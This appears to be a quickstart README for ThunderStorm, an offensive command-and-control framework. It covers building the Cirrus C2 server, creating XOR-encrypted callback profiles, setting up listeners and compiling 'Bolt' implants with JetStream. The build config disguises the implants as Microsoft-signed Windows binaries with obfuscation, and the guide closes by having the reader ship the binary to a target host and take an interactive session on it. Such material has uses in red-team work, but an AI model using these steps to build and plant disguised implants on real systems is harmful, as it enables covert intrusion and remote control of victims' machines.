# Quickstart Guide!

Welcome! Here's some basic steps to bootstrap and get you running ThunderStorm :D

## ToC

- Prerequisites
  - Installing Dependencies
- Building Cirrus
- Loading Profiles
  - Creating your first Profile
  - Importing the Profile into Cirrus
  - Setting up a Listener
- JetStream
  - Initial Configuration
  - Building your first Bolt!
- First Interactions

# Prerequisites

**First things first**: Make sure you cloned this repository with `--recurse`!
You will need the XMT src in order to run some builds and scripts!

## Installing Dependencies

There is not many dependencies that you'll need unless you are doing any building.

_For commands: If the line starts with '#' it means you're root for this_

### Client Dependencies

- Python3
- Python PIP _(Only if you want to install Python Packages under PIP)_
- Python Requests Package
- Python Websocket-Client Package

To install these:

#### ArchLinux (Easiest)

**Python with Packages (recommended)**

```bash
# pacman -S python python-websocket-client python-requests
```

**Python with PIP and Packages**

```bash
# pacman -S python python-pip
$ pip install requests websocket-client
```

#### Kali (or any distro with "apt")

**Python with Packages (recommended)**

```bash
# apt install python3 python3-websocket python3-requests
```

**Python with PIP and Packages**

```bash
# apt install python3 python3-pip
$ pip install requests websocket-client
```

### Building Dependencies

Now, if you're building, you will need the above dependencies and the following
additional ones

- Golang
- Garble _(Optional, only if using Garble)_
- GCC
- Openssl _(Optional, only if using the Signer)_
- Osslsigncode _(Optional, only if using the Signer)_
- UPX _(Optional, only if using UPX)_
- MinGW (x64) _(Optional, only if building for Windows x64)_
- MinGW (x86) _(Optional, only if building for Windows x86)_

To install these:

#### ArchLinux (Easiest)

**Basic (Required)**

```bash
# pacman -S go gcc
```

**To use the Signing tool**

```bash
# pacman -S openssl
```

You'll have to use your preferred AUR helper for `osslsigncode` or build it from
[here](https://github.com/mtrojnar/osslsigncode).

If you have `yay` you can use

```bash
yay -S osslsigncode
```

**To use UPX**

```bash
# pacman -S upx
```

**To build for Windows (x86 and x64)**

```bash
# pacman -S mingw-w64-binutils mingw-w64-crt mingw-w64-gcc mingw-w64-headers mingw-w64-winpthreads
```

**If you want it all**

```bash
# pacman -S go gcc openssl upx mingw-w64-binutils mingw-w64-crt mingw-w64-gcc mingw-w64-headers mingw-w64-winpthreads
$ yay -S osslsigncode
```

#### Kali (or any distro with "apt")

**Basic (Required)**

```bash
# apt install golang gcc
```

**To use the Signing tool**

```bash
# apt install openssl osslsigncode
```

**To use UPX**

```bash
# apt install upx
```

**To build for Windows (x86 and x64)**

```bash
# apt install binutils-mingw-w64 gcc-mingw-w64-x86-64-win32-runtime gcc-mingw-w64 gcc-mingw-w64-base gcc-mingw-w64-i686 mingw-w64 mingw-w64-tools
```

**If you want it all**

```bash
# apt install golang gcc openssl osslsigncode upx binutils-mingw-w64 gcc-mingw-w64-x86-64-win32-runtime gcc-mingw-w64 gcc-mingw-w64-base gcc-mingw-w64-i686 mingw-w64 mingw-w64-tools
```

#### Garble

If you would like to use [Garble](https://github.com/burrowers/garble) you can
run the following on any system to install it:

```bash
go install mvdan.cc/garble@latest
```

## Building Cirrus

Building Cirrus is pretty simple. Change into the cloned "ThunderStorm" directory
and then run

```bash
bash cirrus/build.sh
```

Should take less than a minute and a new file `./bin/cirrus` should be present
now.

If you have any errors, running the `go mod tidy` command will fix those, then
just re-run the command above.

## Loading Profiles

This walkthrough will give you a _very_ basic into Profiles as they are very complex
utilities that can be used in cool ways.

First off, go ahead and issue the command:

```bash
python bin/profile
```

This will show you just how many options are avaliable to you.

### Creating your first Profile

Let's go ahead an build a simple Profile to bootstrap outselves.

Run the command, replace "<ip:port>" with the ip/hostname of your C2 and port
you'll be using (in host:port format). For this example we will use TCP.

```bash
python bin/profile -o profile.bin --tcp --xor --sleep 10s --jitter 50 --host <ip:port>
```

This will create a new file "profile.bin" that specifies a basic Profile that:

- Uses TCP.
- Wrapped with XOR for encryption.
- Uses an initial Bolt sleep time of 10 seconds.
- Uses a Jitter percentage of 50%.
- Sets the host to the target IP/Hostname and port you specified.

We can examine and verify our new Profile by running the following command:

```bash
python bin/profile -f profile.bin -p
```

This will pretty-print the output of our Profile in JSON for us. It should look
similar to this below:

```json
[
    [
        {
            "type": "host",
            "args": "192.168.1.20:443"
        },
        {
            "type": "sleep",
            "args": "10s"
        },
        {
            "type": "jitter",
            "args": 50
        },
        {
            "type": "tcp"
        },
        {
            "type": "xor",
            "args": "3SFqc8fnrc5boEX7usd0+wD2rANraSOAnKVcgKH6CwPgDpD+0gzAKtexFTRbDmGrzTcVJfXDa1nRHj4D/dSDag=="
        }
    ]
]
```

The value for the "xor" section should be different, as it's randomally generated.
Looks good? Let's import that into Cirrus.

### Importing the Profile into Cirrus

Alright, this is where the fun begins!

Pop open a new shell window and change into the cloned "ThunderStorm" directory again.

Run the command:

```bash
./bin/cirrus -b localhost:7777 -p supersecret
```

This will launch Cirrus and bind the control address to port tcp/7777 on the local
address. If you would like to change it, it takes the "host:port" format.

The "-p supersecret" argument is specifying the authentication password that Doppler
clients need to use to connect to Cirrus. We recommend you change this and use a
better password.

_While not recommended, you can force Cirrus to not need a password, however this_
_can allow anyone to connect and gives them the ability to control your Bolts and_
_Listeners!_

Once cirrus is online, run the following command in your previous terminal (the
one not running Cirrus).

_If you changed the Cirrus bind address or password, make sure to change it in_
_the command below_

```bash
python bin/doppler -a "http://localhost:7777" -p supersecret
```

Now this should land you into a happy interface like below:

```text
Welcome to the Doppler  interface. Use "help" to display the command guide.
Happy hacking!
 >
```

If you get connection or authentication errors, check the command and make sure
you entered the correct ip/port and password and try again.

Once you're in the Doppler command line, go ahead and issue the `profiles`
command, you should see the command prefix is now looking like below:

```text
 > Profiles >
```

If so, now let's import that Profile!

Doppler will _always_ attempt to understand the command line arguments as if you
were running under an actual shell. This includes using "~/" or even environment
variables.

Let's give that profile the name "test1", so enter the following (Make sure you're
at least in the same directory "profile.bin" is in):

```text
import test1 profile.bin
```

You should see the following:

```text
[+] Imported Profile "test1"!
 > Profiles >
```

And you can enter `ls` to confirm it:

```text
 > Profiles > ls
Name            Details
===================================
test1           host,sleep,jitter,tcp,xor
 > Profiles >
```

Now you have a Profile ready to be used!

### Setting up a Listener

Now you have a Profile all ready to go, let's add a Listener with it.

From where you are in Doppler, type in `main` to take you back to the main menu.
Then type `listener` and hit enter.

_Protip: you can always hit CTRL+C to cancel a command or go back one level_
_while CTRL_D will exit the shell._

Now you should see the following prompt:

```text
 > Listeners >
```

In here we can now add Listeners, we're going to add a Listener called "test" with
our Profile "test1".

Type in the following command (Replace "<ip:port>" with the ip/hostname of your
C2 and port you'll be using, in host:port format. Similar to when you created the
Profile):

```text
new test <ip:port> test1
```

_For the Profile name, you can use tab auto-completion if you desire!_

Now you should something similar to the following:

```text
[+] Listener "test" @ 192.168.1.20:443 (host,sleep,jitter,tcp,xor) created!
 > Listeners >
```

You can check it with the following command (in the same Doppler terminal);

```text
!netstat -pant|grep cirrus
```

_Yup that's right! You can enter local commands on the host as long as they are_
_prefixed with "!". NOTE: For security reasons, history entries and oneliners cannot_
_run commands._

You should see something similar to:

```text
tcp        0      0 192.168.1.20:443        0.0.0.0:*               LISTEN      3626496/./cirrus
tcp        0      0 127.0.0.1:7777          0.0.0.0:*               LISTEN      3626496/./cirrus1
```

Once you see this, type `bolts` to go to the Bolts menu, which is where we can
wait to see any new connections!

Now you're ready to connect some Bolts!

# JetStream

JetStream is how we'll build the Bolts for you to use. Once we configure JetSteam
a simple command will make it all work.

## Initial Configuration

Copy this example config and place it in the same directory as the "profile.bin"
file, name it `js.json`.

```json
{
    "build": {
        "generators": {
            "bolt": {
                "critical": false,
                "guardian": "WindowsLoginEvent",
                "ignore": false,
                "linker": "event",
                "load": true,
                "pipe": "WindowMessageEvent",
                "profile": "profile.bin",
                "service": false
            }
        },
        "options": {
            "cgo": true,
            "compact": true,
            "crypt": true,
            "garble": true,
            "goroot": "",
            "strip": true,
            "tags": [
                "implant",
                "nojson",
                "noproxy"
            ],
            "upx": false
        },
        "support": {
            "cgo_export": "",
            "manifest": true,
            "rc": {
                "company": "Microsoft Corporation",
                "copyright": "Microsoft Corporation. All rights reserved.",
                "enabled": true,
                "product": "Microsoft Windows Operating System",
                "title": "",
                "version_multi": {
                    "chance": 0,
                    "choices": [
                        "6.3.9600.16384",
                        "10.0.0.0",
                        "6.2.9600.0",
                        "6.1.9600.0",
                        "6.0.9600.0"
                    ],
                    "default": "6.3.9600.16384",
                    "enabled": true
                }
            },
            "sign": {
                "date_range": 712,
                "enabled": true,
                "generate_name": "Microsoft Windows",
                "generate_target": "microsoft.com"
            }
        }
    },
    "config": {
        "log": {
            "level": "DEBUG"
        }
    }
}
```

This is the basic config file that will get you started easily. This configuration
will work well on Windows and will need some tweaking for any *nix system.

### Linux/BSD/OSX Support

If you would like to run a non-Windows build, the only things you would have to
change are:

- "build.generators.bolt.linker" to "pipe"
  - This is the only supported non-Windows event type
  - I would also change the name of "build.generators.bolt.guardian" and "build.generators.bolt.pipe"
    to fit the OS theme you're going for.
- "build.options.cgo" to false
- "build.support.rc.enabled" to false
- "build.support.sign.enabled" to false

The reason you need to change these (besides the linker type) is that JetStream
will still RC and sign non-Windows binaries, which might seem weird for a "Microsoft"
signed binary running as "httpd" or "apache2" lol.

## Building your first Bolt!

Showtime! Let's get to building.

To build with JetStream, there is three **super** (technically four) important
things to remember:

- Configuration file "-c"
  - Make sure it's correct!
- Output and Output Type "-o"
  - If you would like a DLL file, don't forget to add a "-D", so "-o" becomes "-Do"
- OS/Arch
  - JetStream needs the OS/Arch (in a Go format) to build what you want.
- _Overrides can be specified to change the config values for each build if you desire._
  - These are additional command line arguments.

With that in mind, lets pick a build type. Heres some common ones:

- windows/amd64
- linux/amd64
- darwin/amd64

There are more avaliable, consult `go tool dist list` for all of them.
_NOTE: JetStream might not be able to build new types as soon as they come out._

Once you made your pick, let's fire up JetStream by running (Omit the ".exe" if
your're not building for Windows and replace "<os/arch>" with your chosen target):

```bash
python bin/jetstream -rc js.json -o bolt.exe <os/arch>
```

Now watch the magic happen as it completes your build!

# First Interactions

Once you completed all this! First off, congrats! Second, find a way to ship that
shiny new binary off to the target host you want to run on!

Once you get it there, give it a kick and bring it to life by starting it. Nothing
special will happen on screen (if you're not on a shell), but watch your Doppler
shell that we had open earlier.

```text
 > Bolts >
New Bolt Registered: ABCDEEF0 test @ 192.168.1.50
```

Woo! Now, lets interact with it. On your Doppler shell, type in "ls" in the "Bolts"
menu, you should see something like this:

```text
ID       Hostname            IP               OS        User                            PID      Last
=========================================================================================================
ABCDEEF0 test-victim         192.168.1.50     Linux     test                            12345    1s
```

Now type in the Bolt ID value (ABCDEEF0 in our case) and you'll land into the
interactive shell like so:

```text
 > Bolts > ABCDEEF0 >
```

Now you're ready to Hack the Planet!

_More in-depth guides comming soon..._
